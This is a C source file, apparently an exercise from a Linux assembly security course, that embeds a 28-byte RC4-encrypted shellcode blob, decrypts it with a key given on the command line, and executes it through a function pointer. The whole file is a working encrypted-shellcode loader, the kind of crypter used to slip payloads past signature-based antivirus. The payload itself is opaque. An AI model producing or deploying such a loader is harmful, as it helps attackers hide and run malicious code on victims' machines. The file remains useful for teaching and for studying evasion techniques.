// RC4Dec.c
// The following code has been taken and modified from Vivek Ramachandran's SLAE course.
// http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
// 
// Tristan aka R3OATH
// Website: www.r3oath.com

#include<stdio.h>
#include<stdlib.h>
#include<string.h>

unsigned char s[256];
int rc4_i;
int rc4_j;

unsigned char shellcode[] = \
"\xd8\xf3\xb1\x67\x70\x7a\xd5\x3e\x65\xba\x7f\xad"
"\x84\xc5\x4f\x9e\x7e\x14\xb3\x0c\x4c\x4b\x20\x03"
"\xed\xfb\xad\x09";

void swap(unsigned char *s1, unsigned char *s2) {
	char temp = *s1;
	*s1 = *s2;
	*s2 = temp;
}

int InitRC4(void) {
	int i;
	for(i=0 ; i< 256; i++)
		s[i] = i;
	rc4_i = rc4_j = 0;
	return 1;
}

int GenerateKSA(unsigned char *key, int key_len) {
	for(rc4_i = 0; rc4_i < 256; rc4_i++) {
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% 256;
		swap(&s[rc4_i], &s[rc4_j]);
	}
	rc4_i = rc4_j = 0;
}

char GetPRGAByte(void) {
	rc4_i = (rc4_i +1 ) % 256;
	rc4_j = (rc4_j + s[rc4_i]) % 256;
	swap(&s[rc4_i], &s[rc4_j]);
	return s[(s[rc4_i] + s[rc4_j]) % 256];
}

int main(int argc, char **argv) {
	printf("[+] RC4 Shellcode Decrypter\n");

	if(argc <= 1) {
		printf("[+] Please specify a Decryption key!\n");
		printf("[+] Usage: ./RC4Dec <key>\n");
		exit(-1);
	}

	unsigned char *decryption_key;
	int decryption_key_length;
	int shellcode_length;
	int counter;

	int (*ret)() = (int(*)())shellcode;

	decryption_key = (unsigned char *)argv[1];
	decryption_key_length = strlen((char *)decryption_key);

	if(decryption_key_length > 256) {
		printf("[+] Key too large. Should be <= 256 characters!\n");
		exit(-1);
	}

	InitRC4();
	GenerateKSA(decryption_key, decryption_key_length);

	shellcode_length = strlen(shellcode);
	printf("[+] Decrypting Shellcode...\n");

	for (counter = 0; counter < shellcode_length; counter++) {
		shellcode[counter] ^= GetPRGAByte();
		// printf("(%i):", counter);
		// printf("\\x%02x ", shellcode[counter]);
	}

	printf("\n[+] Executing...");
	ret();

	return 1;
}